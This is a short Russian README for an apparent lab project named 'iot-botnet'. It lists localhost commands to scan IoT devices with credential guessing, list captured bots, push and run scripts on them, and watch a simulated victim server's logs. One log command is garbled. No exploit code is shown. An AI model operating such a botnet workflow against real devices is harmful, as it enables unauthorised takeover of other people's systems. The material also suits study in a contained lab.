# iot-botnet

## Запуск
```bash
docker-compose up -d
```
## Начать сканирование и подбор учетных данных
```bash
curl http://localhost:8080/start_scan
curl http://localhost:8080/stop_scan
curl http://localhost:8080/list_bots
```
## Загрузить и выполнить скрипт на ботах
```bash
curl http://localhost:8080/deploy_scripts
curl http://localhost:8080/execute_scripts
```
## Посмотреть логи атакуемого сервера
```bash
docker exec -it victim_server tail -f /var/log/victim/access.loger tail -f /var/log/victim/access.log
```
## Зайти в web-интерфейс ip-камеры через браузер
```bash
http://localhost:8081/
```
